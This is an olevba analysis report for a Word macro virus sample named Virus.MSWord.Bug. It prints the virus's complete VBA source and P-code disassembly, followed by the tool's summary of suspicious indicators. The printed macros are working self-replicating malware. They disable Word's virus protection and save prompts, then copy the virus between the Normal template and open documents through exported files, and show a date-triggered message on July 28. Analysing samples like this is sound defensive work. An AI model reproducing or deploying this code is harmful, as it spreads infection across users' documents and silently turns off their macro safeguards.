olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bug
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bug - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Tester2/23/01 11:12:58 AM00012144
T.UserForm_Click
'Tester2/23/01 11:12:58 AM00012144
If Day(Now) = 28 And Month(Now) = 7 Then T.Show
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
Sub ViewVBCode()
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
Sub ToolsMacro()
'Tester2/23/01 11:12:58 AM00012144
End Sub
-------------------------------------------------------------------------------
VBA MACRO T.frm 
in file: ./Virus.MSWord.Bug - OLE stream: 'Macros/VBA/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Tester2/23/01 11:12:58 AM00012144
Sub UserForm_Click()
'Tester2/23/01 11:12:58 AM00012144
On Error GoTo out
'Tester2/23/01 11:12:58 AM00012144
Options.VirusProtection = False
'Tester2/23/01 11:12:58 AM00012144
Options.SaveNormalPrompt = False
'Tester2/23/01 11:12:58 AM00012144
Options.ConfirmConversions = False
'Tester2/23/01 11:12:58 AM00012144
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.countoflines
'Tester2/23/01 11:12:58 AM00012144
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.countoflines
'Tester2/23/01 11:12:58 AM00012144
If nt > 0 And ad > 0 Then GoTo out
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 Then
'Tester2/23/01 11:12:58 AM00012144
    Set infect = NormalTemplate.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
    Set host = ActiveDocument.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).codemodule.replaceline 3, Application.UserInitials & ".UserForm_Click"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).codemodule.replaceline 5, "If Day(Now) = 28 And Month(Now) = 7 Then " & Application.UserInitials & ".show"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).Name = infect.Item(1).Name
'Tester2/23/01 11:12:58 AM00012144
    host.Item(2).Name = Application.UserInitials
'Tester2/23/01 11:12:58 AM00012144
    host.Item(1).Export "c:\one.sys"
'Tester2/23/01 11:12:58 AM00012144
    host.Item(2).Export "c:\two.sys"
'Tester2/23/01 11:12:58 AM00012144
End If
'Tester2/23/01 11:12:58 AM00012144
If ad = 0 Then Set infect = ActiveDocument.VBProject.VBComponents
'Tester2/23/01 11:12:58 AM00012144
infect.Import ("c:\two.sys")
'Tester2/23/01 11:12:58 AM00012144
infect.Item(1).codemodule.AddFromFile ("c:\one.sys")
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(1).codemodule
'Tester2/23/01 11:12:58 AM00012144
    For x = 1 To 4
'Tester2/23/01 11:12:58 AM00012144
    .deletelines 1
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
    If nt = 0 Then
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 9, vbCr & "Sub ViewVBCode()"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 11, vbCr & "End Sub"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 13, vbCr & "Sub ToolsMacro()"
'Tester2/23/01 11:12:58 AM00012144
    .insertlines 15, vbCr & "End Sub"
'Tester2/23/01 11:12:58 AM00012144
    End If
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 Then infect.Item(1).codemodule.replaceline 1, "Sub AutoClose()"
'Tester2/23/01 11:12:58 AM00012144
If nt = 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(2).codemodule
'Tester2/23/01 11:12:58 AM00012144
    .deletelines 1
'Tester2/23/01 11:12:58 AM00012144
    For x = 1 To infect.Item(2).codemodule.countoflines Step 2
'Tester2/23/01 11:12:58 AM00012144
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
With infect.Item(1).codemodule
'Tester2/23/01 11:12:58 AM00012144
    For x = 2 To infect.Item(1).codemodule.countoflines Step 2
'Tester2/23/01 11:12:58 AM00012144
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tester2/23/01 11:12:58 AM00012144
    Next x
'Tester2/23/01 11:12:58 AM00012144
End With
'Tester2/23/01 11:12:58 AM00012144
out:
'Tester2/23/01 11:12:58 AM00012144
If nt <> 0 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tester2/23/01 11:12:58 AM00012144
End Sub
'Tester2/23/01 11:12:58 AM00012144
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bug
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 2772 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #2:
' 	Ld T 
' 	ArgsMemCall UserForm_Click 0x0000 
' Line #3:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x001C 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0007 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld T 
' 	ArgsMemCall Show 0x0000 
' 	EndIf 
' Line #5:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #6:
' 	EndSub 
' Line #7:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #8:
' 	FuncDefn (Sub ViewVBCode())
' Line #9:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #10:
' 	EndSub 
' Line #11:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #12:
' 	FuncDefn (Sub ToolsMacro())
' Line #13:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #14:
' 	EndSub 
' Macros/VBA/T - 11717 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #1:
' 	FuncDefn (Sub UserForm_Click())
' Line #2:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #3:
' 	OnError out 
' Line #4:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #7:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #10:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #11:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St ad 
' Line #12:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #13:
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	St nt 
' Line #14:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #15:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #16:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #17:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #19:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infect 
' Line #20:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #21:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set host 
' Line #22:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #23:
' 	LitDI2 0x0003 
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitStr 0x000F ".UserForm_Click"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #24:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #25:
' 	LitDI2 0x0005 
' 	LitStr 0x0029 "If Day(Now) = 28 And Month(Now) = 7 Then "
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitStr 0x0005 ".show"
' 	Concat 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' Line #26:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #27:
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #28:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #29:
' 	Ld Application 
' 	MemLd UserInitials 
' 	LitDI2 0x0002 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	MemSt New 
' Line #30:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #31:
' 	LitStr 0x000A "c:\one.sys"
' 	LitDI2 0x0001 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #32:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #33:
' 	LitStr 0x000A "c:\two.sys"
' 	LitDI2 0x0002 
' 	Ld host 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #34:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #37:
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	Set infect 
' 	EndIf 
' Line #38:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #39:
' 	LitStr 0x000A "c:\two.sys"
' 	Paren 
' 	Ld infect 
' 	ArgsMemCall Import 0x0001 
' Line #40:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #41:
' 	LitStr 0x000A "c:\one.sys"
' 	Paren 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #42:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #43:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #44:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #45:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #46:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #47:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #48:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #49:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #50:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #51:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #52:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #53:
' 	LitDI2 0x0009 
' 	Ld vbCr 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #54:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #55:
' 	LitDI2 0x000B 
' 	Ld vbCr 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #56:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #57:
' 	LitDI2 0x000D 
' 	Ld vbCr 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #58:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #59:
' 	LitDI2 0x000F 
' 	Ld vbCr 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	ArgsMemCallWith insertlines 0x0002 
' Line #60:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #63:
' 	EndWith 
' Line #64:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #65:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	LitStr 0x000F "Sub AutoClose()"
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	ArgsMemCall replaceline 0x0002 
' 	EndIf 
' Line #66:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #67:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Eq 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #68:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #69:
' 	StartWithExpr 
' 	LitDI2 0x0002 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #70:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #71:
' 	LitDI2 0x0001 
' 	ArgsMemCallWith deletelines 0x0001 
' Line #72:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #73:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #74:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #75:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #76:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #77:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #78:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #79:
' 	EndWith 
' Line #80:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #81:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	With 
' Line #82:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #83:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	ArgsMemLd Item 0x0001 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #84:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #85:
' 	Ld x 
' 	LitStr 0x0001 "'"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Now 
' 	Concat 
' 	Ld Application 
' 	MemLd ActivePrinter 
' 	Concat 
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	Concat 
' 	ArgsMemCallWith replaceline 0x0002 
' Line #86:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #87:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #88:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #89:
' 	EndWith 
' Line #90:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #91:
' 	Label out 
' Line #92:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #93:
' 	Ld nt 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ad 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #94:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
' Line #95:
' 	EndSub 
' Line #96:
' 	QuoteRem 0x0000 0x0021 "Tester2/23/01 11:12:58 AM00012144"
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�WOOBIE@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�"Das Woo"�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R.I.P. July 28, 1998�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�We Love YOu
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�-=-=-=-=-�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�1992-1998�@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�You Will Be Missed, �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Courier New
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label7'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label8'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label9'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label10'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label11'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label12'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label13'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label14'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label15'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label16'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label17'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label18'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label19'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label20'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label21'" IN './Virus.MSWord.Bug' - OLE stream: 'Macros/T'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |UserForm_Click      |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

